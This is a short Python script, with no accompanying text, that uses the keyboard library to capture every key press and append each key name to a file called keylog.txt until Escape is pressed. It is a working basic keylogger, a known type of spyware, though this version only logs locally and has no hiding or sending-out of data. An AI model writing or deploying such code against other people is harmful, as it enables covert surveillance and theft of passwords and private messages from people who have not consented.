import keyboard

def on_press(event):
    with open("keylog.txt", "a") as f:
        f.write(f"{event.name}\n")

keyboard.on_press(on_press)

keyboard.wait('esc')